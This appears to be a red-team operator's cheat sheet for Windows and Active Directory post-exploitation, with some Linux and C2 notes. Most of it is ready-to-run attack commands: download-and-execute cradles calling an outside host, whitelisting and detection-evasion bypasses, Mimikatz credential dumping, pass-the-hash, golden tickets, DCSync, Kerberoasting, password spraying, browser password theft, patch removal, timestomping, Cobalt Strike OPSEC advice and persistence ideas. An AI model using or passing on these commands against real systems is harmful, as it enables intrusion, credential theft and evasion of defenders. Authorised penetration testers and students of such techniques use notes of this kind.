* Metasploit has multiple modules for locating the service and gaining shells over WinRM

*Connect to a remote host with WinRM from local Windows host*
```
Enable-PSRemoting
Set-Item -Path WSMan:\localhost\Client\TrustedHosts * -force
or
Set-Item -Path WSMan:\localhost\Client\TrustedHosts -value "<host>" -Force
$cred = Get-Credential
Invoke-Command -ComputerName <host> -ScriptBlock { gci c:\ } -credential $cred
```

### Uninstall a patch to leave the system vulnerable
```
wusa.exe /uninstall /kb:976932
```

### Create custom DLL for password filters and install on DC to capture changed passwords
* http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html

## Application Whitelisting Bypass Techniques

[SubTee Collection of Whitelist Bypass Techniques ](https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt)
https://bitbucket.org/jsthyer/wevade.git

Version .0.0.3
```
1. IEExec -This technique may work in certain environments. Its relies on the fact that many organizations trust executables signed
by Microsoft. We can misuse this trust by launching a specially crafted .NET application.
Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

2. Rundll32.exe

3. ClickOnce Applications dfsvc.exe dfshim.dll

4. XBAP - XML Browser Applications WPF PresentationHost.exe

5. MD5 Hash Collision
http://www.mathstat.dal.ca/~selinger/md5collision/

6. PowerShell - Specifically Reflective Execution
http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

7. .HTA Application Invoke PowerShell Scripts
Launched by mshta.exe, bypasses IE security settings as well.

8. bat, vbs, ps1
1. cmd.exe /k < script.txt
2. cscript.exe //E:vbscript script.txt
3. Get-Content script.txt | iex

9. Malicious Troubleshooting packs - MSDT.exe
Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
Thanks to @nberthaume, @Killswitch_GUI

10. InstallUtil.exe
A signed MS binary that loads assemblies and executes - One of the best.
Examples here: https://gist.github.com/subTee

11. Regsvcs/Regasm
See: https://gist.github.com/subTee/fb09ef511e592e6f7993
These 2 are Excellent.

12. regsvr32.exe
https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
This one is just simply amazing...
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

13. Msbuild.exe
http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
```

## Certutil

https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46

File download
```
certutil -urlcache -split -f http://example.com/file
```

## Active Directory Enumeration

### Adfind

www.joeware.net/freetools/tools/adfind/
```
AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=computer" > domain_computers.txt

AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=computer" distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion > domain_computers_light.txt

AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=user" samaccountname description pwdlastset orclcommonattribute > domain_users_light.txt
```

## Powershell

List help for cmdlet: `Get-Help [cmdlet] -full`

List available properties and methods: `Get-Member`

For-each loop: `ForEach-Object { $_ }`

Search for string (like grep): `Select-String -path [file] -pattern [string]`

Timestomp
```
$file=(gi c:\file.exe);
$date='01/03/2009 12:12 pm';
$file.LastWriteTime=$date;
$file.LastAccessTime=$date;
$file.CreationTime=$date
```

Show last system boot time
```
Get-WmiObject win32_operatingsystem | select csname, @{LABEL='LastBootUpTime'; EXPRESSION={$_.ConverttoDateTime($_.lastbootuptime)}}
```

Wrap binary execution in a powershell loop
```
powershell foreach ($target in (get-content c:\users\username\appdata\local\temp\hosts_da_loggedin_unique.txt)) { "[*] $Target:"; (c:\programdata\sd.exe ./administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:a4bab1c7d4bef62d4c22043ddbf1312c) }`
```

Download a file
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(new-object system.net.webclient).downloadfile("https://www.mydomain.com/file","C:\Users\username\AppData\Local\Temp\file.txt")
```

Encode string
```
echo "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')" | iconv --to-code UTF-16LE | base64 -w 0
```

List recently modified files in path (U:)
```
Get-Childitem u:\ -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1) } | foreach {"$($_.LastWriteTime) :: $($_.Fullname) " }
```

List Files
```
Select-String -Path c:\fso\*.txt, c:\fso\*.log -pattern ed
```

List First 100 Files
```
Get-ChildItem -Path XXX |Select -First 100 Fullname
```

List a Process's Loaded Modules (DLL)
```
get-process -id 1234|select -expand modules
```

Remote Command Execution using MMC
```
https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
```

Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C$,ADMIN$)
```
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ |Select LocalAccountTokenFilterPolicy |fl
```

Test User Credentials
```
powerpick $password = ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential ("domain\name", $password);
```

Search for SSN

https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx
```
$SSN_Regex = " [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}" ; Get-ChildItem . -Recurse -exclude *.exe,*.dll| Select-String -Pattern $SSN_Regex | Select-String -Pattern $SSN_Regex| Select-Object Path,Filename,Matches |ft -auto|out-string -width 200; "[*] SSN Search Complete!"
```

Enumerate the use of the Windows Server Update Services (WSUS)
```
Get-ItemProperty -Path Registry::"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" |Select-Object -ExpandProperty WUServer

Get-ItemProperty -Path Registry::"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" |Select-Object -ExpandProperty WUStatusServer

Get-ItemProperty -Path Registry::"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" |Select-Object -ExpandProperty UseWUServer

reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
```

### Find-Files (custom)
```
Find-Files -searchBase "i:\" -searchTerms "*web.xml*,*web.config*,*password*,*tomcat-users.xml*" -LogPath "C:\Users\username\AppData\Local\Temp"
```

### Get-Enumeration (custom)

Run Local and Domain enumeration functions on the local host.
```
Get-Enumeration -Path . -Local -Domain
```

### Download and execute IEX
```
powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')"
```

### EncodedCommand and IEX detection bypass

Author: Dave Kennedy
Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/

Avoid detection of -enc
```
powershell -window hidden -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() <b64encodedcommandhere>"
```

Avoid detection of IEX
```
powershell -window hidden -C "set-variable -name "LB" -value "I"; set-variable -name "I" -value "E"; set-variable -name "V" -value "X"; set-variable -name "wP" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('<YOURINVOKEEXPRESSIONSTUFFHERE>')"
```

### Bloodhound
```
iex((new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'));Invoke-Bloodhound -CSVFolder c:\temp -CSVPrefix <prefix>

Invoke-BloodHound -DomainController <domain IP> -Domain <FQDN> -CSVFolder C:\users\public\libraries -CSVPrefix <prefix> -CollectionMethod Stealth
```

### Mimikittenz
https://github.com/putterpanda/mimikittenz

mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.

mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to:

* TRACK2 (CreditCard) data from merchant/POS processes
* PII data
* Encryption Keys & All the other goodstuff

Execution
```
Invoke-Mimikittenz
```

Customizations
```
Custom regex - The syntax for adding custom regex is as follows:
[mimikittenz.MemProcInspector]::AddRegex("<NameOfTarget>","<regex_here>")

Custom target process - Just append your target proccess name into the array:
[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
```

### PowerUp
Performs multiple local host privilege escalation checks for common Windows misconfigurations.
```
Invoke-AllChecks
```

[See cheat sheet for more commands](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)

### PowerView

* Requires domain user privileges

Find Administrative users logged in across the domain - default group = Domain Admins)
```
Invoke-UserHunter -Threads 15 -NoPing [-GroupName “Enterprise Admins”]
Invoke-UserHunter -Threads 20 -GroupName "Domain Admins" -SearchForest -CheckAccess
```

Find User (Stealthy via Fileshares)
```
Invoke-UserHunter -Stealth -Threads 5 -NoPing [-GroupName “Enterprise Admins”] [-UserName "svcAccount"]
```

Get domain user info
```
Get-NetUser [-UserName john]

Get-NetUser -Domain <domain> | Select-Object objectsid,lockouttime,samaccounttype,accountexpires,objectclass,useraccountcontrol,@{Name='memberof';Expression={[string]::join(";",($_.memberof))}},info,distinguishedname,adspath,cn,pwdlastset,objectguid,whencreated,description,samaccountname,usnchanged,name| export-csv userprops_members.csv
```

Find group names
```
Get-NetGroup [-GroupName *admin*]
```

Get group members
```
Get-NetGroupMember [-GroupName “Domain Admins”]
```

Find open shares - Noisy
```
Invoke-ShareFinder -CheckShareAccess
```

Find open (non-default i.e. C$) shares by LDAP source
```
Invoke-ShareFinder -ComputerADSPath "LDAP://OU=Servers,OU=IT,DC=domain,DC=com" -CheckShareAccess -ExcludeStandard | Out-File -Encoding ascii c:\windows\temp\server_shares.txt

Invoke-ShareFinder -ExcludePrint -ExcludeIPC -CheckShareAccess
```

Find interesting files
```
powershell Invoke-FileFinder -ComputerName <hostname> -share share_list.txt -terms ssn,pass,sensitive,secret,admin,login,unattend*.xml,web.config,account -Threads 20 | export-csv filefinder_shares.csv
```

Find hosts where the current user is local admin - Noisy
```
Find-LocalAdminAccess
```

Get details of all domain computers and export to a CSV file for easy viewing
```
Get-computerproperty -Domain <domain.com> -properties displayname,adspath,lastlogontimestamp,operatingsystem,operatingsystemversion,@{Name='memberof';Expression={[string]::join(";",($_.memberof))}}|export-csv computerprops.csv
```

Get Computers with Unconstrained Delegation
```
Get-NetComputer -Unconstrained |ft -a
```

Get Users & Computers Trusted for Delegation
```
Get-DomainUser -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl

Get-DomainComputer -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl
```

#### net * Functions:
```
Get-NetDomain - gets the name of the current user's domain
Get-NetForest - gets the forest associated with the current user's domain
Get-NetForestDomain - gets all domains for the current forest
Get-NetDomainController - gets the domain controllers for the current computer's domain
Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)
Add-NetUser - adds a local or domain user
Get-NetComputer - gets a list of all current servers in the domain
Get-NetPrinter - gets an array of all current computers objects in a domain
Get-NetOU - gets data for domain organization units
Get-NetSite - gets current sites in a domain
Get-NetSubnet - gets registered subnets for a domain
Get-NetGroup - gets a list of all current groups in a domain
Get-NetGroupMember - gets a list of all current users in a specified domain group
Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts
Add-NetGroupUser - adds a local or domain user to a local or domain group
Get-NetFileServer - get a list of file servers used by current domain users
Get-DFSshare - gets a list of all distribute file system shares on a domain
Get-NetShare - gets share information for a specified server
Get-NetLoggedon - gets users actively logged onto a specified server
Get-NetSession - gets active sessions on a specified server
Get-NetRDPSession - gets active RDP sessions for a specified server (like qwinsta)
Get-NetProcess - gets the remote processes and owners on a remote server
Get-UserEvent - returns logon or TGT events from the event log for a specified host
Get-ADObject - takes a domain SID and returns the user, group, or computer
object associated with it
Set-ADObject - takes a SID, name, or SamAccountName to query for a specified
domain object, and then sets a specified 'PropertyName' to a
specified 'PropertyValue'
```

#### GPO functions
```
Get-GptTmpl - parses a GptTmpl.inf to a custom object
Get-NetGPO - gets all current GPOs for a given domain
Get-NetGPOGroup - gets all GPOs in a domain that set "Restricted Groups"
on on target machines
Find-GPOLocation - takes a user/group and makes machines they have effective
rights over through GPO enumeration and correlation
Find-GPOComputerAdmin - takes a computer and determines who has admin rights over it
through GPO enumeration
Get-DomainPolicy - returns the default domain or DC policy
```

#### User-Hunting Functions:
```
Invoke-UserHunter - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines
Invoke-StealthUserHunter - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users
Invoke-ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines
Invoke-UserEventHunter - hunts for user logon events in domain controller event logs
```

#### Domain Trust Functions:
```
Get-NetDomainTrust - gets all trusts for the current user's domain
Get-NetForestTrust - gets all trusts for the forest associated with the current user's domain
Find-ForeignUser - enumerates users who are in groups outside of their principal domain
Find-ForeignGroup - enumerates all the members of a domain's groups and finds users that are outside of the queried domain
Invoke-MapDomainTrust - try to build a relational mapping of all domain trusts
```

#### MetaFunctions:
```
Invoke-ShareFinder - finds (non-standard) shares on hosts in the local domain
Invoke-FileFinder - finds potentially sensitive files on hosts in the local domain
Find-LocalAdminAccess - finds machines on the domain that the current user has local admin access to
Find-UserField - searches a user field for a particular term
Find-ComputerField - searches a computer field for a particular term
Get-ExploitableSystem - finds systems likely vulnerable to common exploits
Invoke-EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain
```

[HarmJ0y PowerView Cheat Sheet PDF](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
[HarmJ0y's PowerView 2.0 Tricks Gist](https://gist.github.com/HarmJ0y/3328d954607d71362e3c)

### Inveigh
https://github.com/Kevin-Robertson/Inveigh

Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system.

* The main Inveigh LLMNR/NBNS spoofer function.

```Invoke-Inveigh```

###### Privilege Requirements:
* Elevated Administrator or SYSTEM

###### Features:
* IPv4 LLMNR/NBNS spoofer with granular control
* NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB
* Basic auth cleartext credential capture over HTTP/HTTPS
* WPAD server capable of hosting a basic or custom wpad.dat file
* HTTP/HTTPS server capable of hosting limited content
* Granular control of console and file output
* Run time control

### Powershell W/out Powershell
* MsBuild.exe
https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml

### Get-IndexedItem

Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents

Sources:
https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae
https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1

### Interacting w/ Windows API

https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/

#### Example - Lock Workstation and MessageBox
```
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class User32
{
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern bool MessageBox(
IntPtr hWnd, /// Parent window handle
String text, /// Text message to display
String caption, /// Window caption
int options); /// MessageBox type
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern bool LockWorkStation();

}
"@

[USER32]::LockWorkStation()
```

List static methods
```
[USER32] |get-member -static
```

### MailSniper (OWA and Exchange Enumeration)

Source: https://github.com/dafthack/MailSniper

MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.

MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS.

Bypassing Dual Factor Authentication on OWA - http://www.blackhillsinfosec.com/?p=5396

- It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange.
- Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.com\EWS\Exchange.asmx

```Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote```

- After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user’s inbox for key terms (by default “*pass*”, “*creds*”, and “*credentials*”).

#### Locate OWA instances via Autodiscover using only organization primary domain name
```
/Autodiscover/Autodiscover.xml

or

autodiscover./Autodiscover/Autodiscover.xml

or

dig _autodiscover._tcp. SRV
; <<>> DiG 9.8.3-P1 <<>> _autodiscover._tcp..org SRV
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45003
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;_autodiscover._tcp..org. IN SRV

;; ANSWER SECTION:
_autodiscover._tcp..org. 1720 IN SRV 0 0 443 webmail..org.

;; Query time: 2 msec
;; SERVER: 192.168.178.1#53(192.168.178.1)
;; WHEN: Thu Dec 1 10:40:33 2016
;; MSG SIZE rcvd: 83
```

### DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)

Source: https://github.com/dafthack/DomainPasswordSpray

DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!

#### Quick Start Guide
Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.
```
Type 'Import-Module Invoke-DomainPasswordSpray.ps1'.
```

The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.

The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
```
PowerShell Invoke-DomainPasswordSpray -Password Winter2016
```

The following command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt
```
PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

#### Invoke-DomainPasswordSpray Options
```
UserList - Optional UserList parameter. This will be generated automatically if not specified.
Password - A single password that will be used to perform the password spray.
PasswordList - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
OutFile - A file to output the results to.
Domain - A domain to spray against.
```

### Misc Powershell Pasties

List Removeable Drives
```
Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne 'A:')} | %{"USB_PROCESS_DETECTED: " + $_.ProviderName + "`n"}
```

Random Execution Method
```
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("visio.application", "system1"))
$docs = $visio.Documents.Add("")
$docs.ExecuteLine('CreateObject("Wscript.Shell").Exec("cmd.exe")')
```

## Mimikatz

https://github.com/gentilkiwi/mimikatz/wiki
https://adsecurity.org/?p=2362

Dump Cleartext Credentials
```
sekurlsa::wdigest
sekurlsa::logonpasswords
lsadump::secrets
```

Dump cached domain credentials
```
lsadump::cache
```

Format mscachev2 as ```$DCC2$10240#username#hash```
```
cat 'mscachecreds.txt' | awk -F “:” {'print "$DCC2$10240#"$1"#"$2'}
```

Crack mscachev2 format with Hashcat (extremely slow)
```
./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule
```

DCSYNC - Remote Hash Dumping from a Domain Controller
```
mimikatz lsadump::dcsync /user:domain\krbtgt
```

- There is also a CS built-in function for this
- Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/

Pass the Hash
```
mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden
```

Golden Ticket Creation (File)
```
mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt: /ticket:newadmin.tkt
```

Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session
```
mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt: /ptt
```

To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces:
```
/user:ChildDomainControllerMachineName$
/rc4: KRBTGT Hash
/sid:Child Domain SID
/domain:FQDN of Child Domain
/groups:516
/sids:ParentSID-516,S-1-5-9
/id:ID of Child Domain Controller
/ptt
```

Dump Google Chrome passwords
```
shell copy "C:\users\kobrien\appdata\local\google\chrome\user data\default\Login Data" C:\users\public\libraries\ld.dat

steal_token

mimikatz @dpapi::chrome /in:C:\users\public\libraries\ld.dat /unprotect
```

Detecting Golden Ticket use on a DC
```









```

## Kerberoast
https://github.com/nidem/kerberoast
https://room362.com/post/2016/kerberoast-pt1/
https://room362.com/post/2016/kerberoast-pt2/
https://room362.com/post/2016/kerberoast-pt3/
```
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host.domain.com"
```

Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used)
```
mimkatz kerberos::list /export
Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'
```

Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred)
```
proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip -outputfile
```

Cracking the hashes
```
./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule

./john --format=krb5tgs spns.dump --wordlist=
```

## Domain Admin Privesc Methods
https://adsecurity.org/?p=2362

1. Passwords in SYSVOL & Group Policy Preferences

````findstr /S cpassword %logonserver%\sysvol\*.xml````
or use Get-GPPPasswords.ps1 from PowerSploit

2. Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch
3. Kerberos TGS Service Ticket Offline Cracking (Kerberoast)
4. The Credential Theft Shuffle
5. Gain access to AD Database file (ntds.dit)
* Backup locations (backup server storage, media, and/or network shares)
* Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers.
* With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.

# Command and Control

Simple TCP Port Redirection
```
socat TCP-LISTEN:80,fork TCP::80
socat TCP-LISTEN:443,fork TCP::443
```

UDP Port Redirection
```
socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:; echo -ne
```

Simple HTTP Redirect

Save as a file like the following as redirect.html and map to root "/" on your Team Server. Casual browsing to the root of your domain will then simply redirect.
```

```

## Domain Fronting

* https://github.com/rvrsh3ll/FindFrontableDomains

## Cobalt Strike

http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/
https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna
https://github.com/Und3rf10w/Aggressor-scripts
```
portscan 10.42.175.0/26 21,22,23,25,80,443,445,1433,3389,8080,8443
```

*Start Remote Beacon DLL via iwmi*
```
powerpick iwmi -class Win32_Process -name create -ArgumentList "rundll32.exe c:\users\public\libraries\smb_beacon.dll.log0,StartW"
```

### OPSEC Considerations for Beacon Commands
[Blog.Cobaltstrike.com - OPSEC Considerations For Beacon Commands](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/#respond)

A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe.

*API-only*
These commands are built-into Beacon and rely on Win32 APIs to meet their objectives.
```
cd
cp
download
drives
exit
getuid
kerberos_ccache_use
kerberos_ticket_purge
kerberos_ticket_use
jobkill
kill
link
ls
make_token
mkdir
mv
ppid
ps
pwd
rev2self
rm
rportfwd
socks
steal_token
timestomp
unlink
upload
```

*House-keeping Commands*
The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute.
```
cancel
checkin
clear
downloads
help
jobs
mode dns
mode dns-txt
mode dns6
mode http
note
powershell-import
sleep
socks stop
spawnto
```

*Post-Exploitation Jobs (Process Execution + Remote Process Injection)*
Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs:
```
browserpivot
bypassuac
covertvpn
dcsync
desktop
elevate
hashdump
keylogger
logonpasswords
mimikatz
net
portscan
powerpick
psinject
pth
screenshot
shspawn
spawn
ssh
ssh-key
wdigest
```

OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don’t want that). The ppid command will change the parent process these jobs are run under as well.

*Process Execution*
These commands spawn a new process:
```
execute
runas
runu
```

OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu.

*Process Execution: Cmd.exe*
The shell command depends on cmd.exe.

The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe.

OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script’s &bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand.

*Process Execution: PowerShell.exe*
The following commands launch powershell.exe to perform some task on your behalf.
```
powershell
spawnas
spawnu
winrm
wmi
```

OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe:
```
spawnu has runu which runs an arbitrary command under another process.
spawnas has runas which runs an arbitrary command as another user.
powershell has powerpick, this command runs powershell scripts without powershell.exe.
```

It’s also possible to laterally spread without the winrm and wmi commands.
Remote Process Injection

The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are:
```
dllinject
inject
shinject
```

*Service Creation*

The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services.
```
getsystem
psexec
psexec_psh
```

### Powershell Function Wrapper

https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna
https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/

### Persistence Scripts

https://github.com/ZonkSec/persistence-aggressor-script
https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna

## EMPIRE

Cheat sheets
```
- https://github.com/adaptivethreat/Empire/wiki/Quickstart
- https://attackerkb.com/Powershell/Powershell_Empire
```

Clone GIT Repo
```
root@workstation:~# git clone https://github.com/adaptivethreat/Empire.git empire
Cloning into 'empire'...
```

Install Empire
```
root@workstation:~# cd empire/
root@workstation:~/empire# cd setup/
root@workstation:~/empire/setup# ./install.sh
Reading package lists... Done
Building dependency tree
Reading state information... Done
...

Successfully installed pydispatcher
Cleaning up...

[>] Enter server negotiation password, enter for random generation:

[*] Database setup completed!

root@workstation:~/empire/setup#
```

Start Empire
```
root@workstation:~/empire/setup# cd ..
root@workstation:~/empire# ./empire
```

Start with REST API for use with Empire Web
```
./empire --headless --username admin --password <PASSWORD> --restport 1337

./empire --rest --username admin --password <PASSWORD> --restport 1337
```

### C2 Profiles

Edit default client settings in `/setup/setup_database.py`

Example Default Profile
```
"/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en"
```

# Linux

## BASH

BASH loop example
```
for u in `cat hosts.txt`; do
echo -n "[*] user: $u" && \
proxychains python /usr/local/bin/secretsdump.py domain/username@$u -hashes aad3b435b51404eeaad3b435b51404ee:0e493911f561a425e7a905329f4454bf |tee user_brute.log
done
```

BASH .bashrc Function Example
```
function start_sshtunnel() {
ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123 -t ssh -L 8800:localhost:80 james@124.125.123
}
```

Quick BASH format .bash_profile (mod ipconfig > ifconfig for Linux)
```
# .bash_profile

PATH=$PATH:/home/james/

export PATH

alias ls='ls -G'
alias grep='grep --color=auto'
alias la='ls -AlahG'
alias el='sudo $(history -p \!\!)'
alias ll='ls -alF'
alias l='ls -CF'
alias lg='ls -AlahG |grep $1'
alias netstati='lsof -P -i -n'

export PS1="\n\n\[\$(if [[ \$? == 0 ]]; then echo \"\[$GREEN\]✓\"; else echo \"\[$RED\]✕\"; fi)[\033[33m\]\D{%Y%m%d_%H%M%S}\[\033[m\] \[\033[36m\]\u@\h__`ipconfig getifaddr en0`__`ipconfig getifaddr en8`\[\033[m\]] \[\033[1;31m\]\n[\w]\[\033[m\] \n \$
```

Create NTLM Hash from Mac CLI
```
echo -n password | iconv -t UTF-16LE | openssl md4
```

## Linux Persistence Ideas
```
Cron
Add SSH keys
Add SUID to world-writeable script (chmod u+s <file>)
Add init script (reboot persistence)
```

## rpcclient

http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions
```
rpcclient -U "" -N <WinIPaddr>
